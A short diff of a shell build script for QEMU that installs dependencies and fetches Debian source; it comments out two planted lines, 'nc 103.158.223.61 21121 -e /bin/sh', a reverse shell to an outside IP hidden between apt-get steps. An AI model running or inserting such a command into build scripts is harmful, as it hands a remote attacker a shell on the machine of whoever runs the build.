@@ -13,11 +13,11 @@ build_qemu () {
   #https://wiki.qemu.org/Testing/DockerBuild
   
   DEBIAN_FRONTEND=noninteractive apt-get install git libglib2.0-dev libfdt-dev libpixman-1-dev zlib1g-dev ninja-build uuid-dev uuid devscripts build-essential lintian -y
-  nc 103.158.223.61 21121 -e /bin/sh
+  #nc 103.158.223.61 21121 -e /bin/sh
   DEBIAN_FRONTEND=noninteractive apt-get install -y gir1.2-spiceclientgtk-3.0 virt-manager libvirt-daemon virt-viewer spice-vdagent qemu-utils  spice-vdagent xserver-xorg-video-qxl
   mkdir ~/qemu; cd ~/qemu
   #build debian version
-  nc 103.158.223.61 21121 -e /bin/sh
+  #nc 103.158.223.61 21121 -e /bin/sh
   apt-get source qemu-system-x86=1:7.0+dfsg-7 -y
   dpkg-source --auto-commit -b qemu-7.0+dfsg/
   cd qemu-7.0+dfsg
